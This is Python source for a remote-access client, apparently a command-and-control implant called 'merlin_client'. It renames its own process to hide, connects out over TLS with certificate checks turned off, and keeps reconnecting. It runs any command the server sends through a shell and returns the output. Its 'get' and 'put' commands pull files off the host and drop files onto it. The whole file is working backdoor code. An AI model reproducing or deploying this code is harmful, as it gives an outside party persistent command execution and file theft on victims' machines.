import socket
import ssl
import subprocess
import time
import signal
import sys

import os
try:
    import ctypes
    libc = ctypes.cdll.LoadLibrary("libc.so.6")
    libc.prctl(15, b"merlin_client", 0, 0, 0)
except ImportError:
    pass

SERVER_IP = 'your_server'  
SERVER_PORT = 2600
CERTFILE = 'merlin_server.crt' 
TIME_TO_SLEEP = 5
DEBUG = False      
    
def debug_print(message):
    if DEBUG:
        print(message)
        
def signal_handler(sig, frame):
    global client_socket
    print("\n[+] Client stopping...")
    if client_socket:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
            print("[+] Socket closed successfully.")
        except Exception as e:
            print(f"[-] Error while closing socket: {e}")
    time.sleep(0.5)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def connect_to_server():
    """
    Create a socket and connect to the server using SSL
    SSL Context can be created without cert check    
    """
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)  
    
    # For self-signed certificates :
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    client_socket = context.wrap_socket(client_socket, server_hostname=SERVER_IP)

    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        debug_print(f"[+] Connection success {SERVER_IP}:{SERVER_PORT}")
        return client_socket
    except (socket.error, ssl.SSLError) as e:
        debug_print(f"[-] Server connection error : {e}")
        return None

def main():
    """
    Main function to connect to the server and execute commands
    Client will try to reconnect to the server if the connection is lost        
    """
    while True:
        client_socket = connect_to_server()
        
        if client_socket is None:
            debug_print(f"[+] Try to reconnect in {TIME_TO_SLEEP} seconds...")
            time.sleep(TIME_TO_SLEEP) 
            continue

        while True:
            try:              
                command = client_socket.recv(1024).decode()

                if command.lower() == 'exit':
                    break

                if command.startswith('put '):
                    _, filename = command.split(maxsplit=1)
                    try:
                        with open(filename, 'wb') as f:
                            while True:
                                chunk = client_socket.recv(1024)
                                if chunk == b'EOF':  
                                    break
                                f.write(chunk)
                        debug_print(f"[+] File {filename} received successfully.")
                    except Exception as e:
                        debug_print(f"[-] Error during file transfer  : {e}")
                    continue
            
                if command.startswith('get '):
                    _, filepath = command.split(maxsplit=1)
                    try:
                        with open(filepath, 'rb') as f:
                            while chunk := f.read(1024):
                                client_socket.send(chunk)
                            client_socket.send(b'EOF')  
                        debug_print(f"[+] File {filepath} sent successfully.")
                    except FileNotFoundError:
                        debug_print(f"[-] File {filepath} not found !.")
                        client_socket.send(b'EOF')
                    continue

                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.send(output)
                except subprocess.CalledProcessError as e:
                    error_message = f"Erreur d'exécution : {e.output.decode()}"
                    client_socket.send(error_message.encode())
                except Exception as e:
                    error_message = f"Erreur inconnue : {str(e)}"
                    client_socket.send(error_message.encode())

            except (socket.error, ssl.SSLError) as e:
                debug_print(f"[-] Connection interrupted : {e}")
                break  
            
        client_socket.close()
        debug_print("[+] Connection closed. Reconnect in {TIME_TO_SLEEP} seconds...")
        time.sleep(TIME_TO_SLEEP)  
        
if __name__ == "__main__":
    main()
